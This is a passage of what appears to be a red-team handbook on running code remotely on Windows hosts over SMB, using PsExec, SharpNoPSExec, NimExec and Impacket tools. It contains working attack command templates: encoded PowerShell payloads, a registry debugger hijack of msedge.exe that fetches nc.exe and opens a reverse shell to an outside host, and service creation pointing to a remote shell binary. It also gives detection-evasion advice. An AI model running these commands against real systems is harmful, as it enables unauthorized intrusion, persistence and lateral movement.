\section{Remote code execution}

RCE is enable by the use of MSRPC over SMB. Different
tehcniques exists such as deploying a service to the \verb+admin$+ share then
accessing the Windows Service Control Manager API and starting the service and
create a named pipes for sending commands.


tools to use:
\begin{itemize}
    \item SysInternals PsExec~\ref{tools:sysinternals:psexec}
    \item Impacket PSExec~\ref{tools:impacket:psexec}
    \item Impacket SMBExec~\ref{tools:impacket:smbexec}
    \item Impacket atexec~\ref{tools:impacket:atexec}
    \item CrackMapExec~\ref{tools:crackmapexec:smb:rce}
    \item Metasploit PsExec~\ref{tools:metasploit}
\end{itemize}

\subsection{Windows}
\subsubsection{PSExec}

By default, PSExec~\ref{tools:sysinternals:psexec} performs the following action:
\begin{enumerate}
    \item Establishes a link to the hidden \verb+ADMIN$+ share, which corresponds to the \verb+C:\Windows+ directory on the remote system, via SMB.
    \item Uses the Service Control Manager (SCM) to initiate the \verb+PsExecsvc+ service and set up a named pipe on the remote system.
    \item Redirects the console’s input and output through the created named pipe for interactive command execution.
\end{enumerate}

Note: PsExec eliminates the double-hop problem because credentials are passed with the command and generates an interactive logon session (Type 2).


\subsubsection{SharpNoPSExec}

\href{https://github.com/juliourena/SharpNoPSExec}{SharpNoPSExec} is a tool designed to facilitate lateral movement by leveraging existing services on a target system without creating new ones or writing to disk, thus minimizing detection risk. The tool queries all services on the target machine, identifying those with a start type set to disabled or manual, current status of stopped, and running with LocalSystem privileges. It randomly selects one of these services and temporarily modifies its binary path to point to a payload of the attacker’s choice. Upon execution, SharpNoPSExec waits approximately 5 seconds before restoring the original service configuration, returning the service to its previous state. This approach not only provides a shell but also avoids the creation of new services, which security monitoring systems could flag.

\begin{verbatim}
SharpNoPSExec.exe --target=<ip> `
    --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e <b64enc_payload>"
\end{verbatim}

\subsubsection{Nimexec}
\href{https://github.com/frkngksl/NimExec}{NimExec} is a fileless remote command execution tool that operates by exploiting the Service Control Manager Remote Protocol (MS-SCMR). Instead of using traditional \verb+WinAPI+ calls, NimExec manipulates the binary path of a specified or randomly selected service with LocalSystem privileges to execute a given command on the target machine and later restores the original configuration. This is achieved through custom-crafted RPC packets sent over SMB and the \verb+svcctl+ named pipe. Authentication is handled using an NTLM hash, which NimExec utilizes to complete the process via the NTLM Authentication method over its custom packets. By manually crafting the necessary network packets and avoiding OS-specific functions, this tool benefits from Nim's cross-compilation capabilities, making it versatile across different operating systems.

\begin{verbatim}
NimExec -u <user> -d <domain_fqdn> -p <password> -t <ip> -c "cmd.exe /c powershell - -exec bypass -nop -e <b64enc_payload>" -v
\end{verbatim}


\subsubsection{Reg.exe}

This process utilizes the \verb+winreg+ SMB pipe. Typically, {\bf the remote registry service is enabled by default only on server-class operating systems.}

Now, we can execute reg.exe to add a new registry key to Microsoft Edge (\verb+msedge.exe+). The idea is that once msedge.exe is executed, it will also execute our specified payload. 

\begin{verbatim}
reg.exe add 
"\\<target_fqdn>\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" 

/v Debugger 
/t reg_sz 
/d "cmd /c copy \\172.20.0.99\share\nc.exe && nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"
\end{verbatim}


\subsection{Linux}

\subsubsection{Psexec.py}
psexec.py creates a remote service by uploading an executable with a random name to the \verb+ADMIN$+ share on the target Windows machine. It then registers this service via RPC and the Windows Service Control Manager. Once registered, the tool establishes communication through a named pipe, allowing for the execution of commands and retrieval of outputs on the remote system.


\subsubsection{smbexec.py}
The smbexec.py method leverages the built-in Windows SMB functionality to run arbitrary commands on a remote system without uploading files, making it a quieter alternative.

Communication occurs exclusively over TCP port 445. It also sets up a service, using only MSRPC for this, and manages the service through the \verb+svcctl+ SMB pipe.

\subsubsection{services.py}
It allows starting, stopping, deleting, reading status, configuring, listing, creating, and modifying services. During Red Teaming assignments, many tasks can be greatly simplified by gaining access to the target machine's services. {\bf This technique is non-interactive}

\begin{verbatim}
services.py <domain_netbios>/<user>:'<password>'@<ip> create -name '<name>' -display '<name>' -path "\\\\<ip>\\share\\rshell-9001.exe"

services.py <domain_netbios>/<user>:'<password>'@<ip> config -name '<name>'

services.py <domain_netbios>/<user>:'<password>'@<ip> start -name '<name>'

services.py <domain_netbios>/<user>:'<password>'@<ip> delete -name '<name>'

services.py <domain_netbios>/<user>:'<password>'@<ip> change -name '<existing_service_name>' -path "\\\\<ip>\\share\\rshell-9001.exe"
\end{verbatim}


\subsubsection{atexec.py}

It utilizes the Windows Task Scheduler service, which is accessible through the \verb+atsvc+ SMB pipe. It enables us to remotely append a task to the scheduler, which will execute at the designated time.

With this tool, the command output is sent to a file, which is subsequently accessed via the \verb+ADMIN$+ share. For this utility to be effective, it's essential to synchronize the clocks on both the attacking and target PCs down to the exact minute.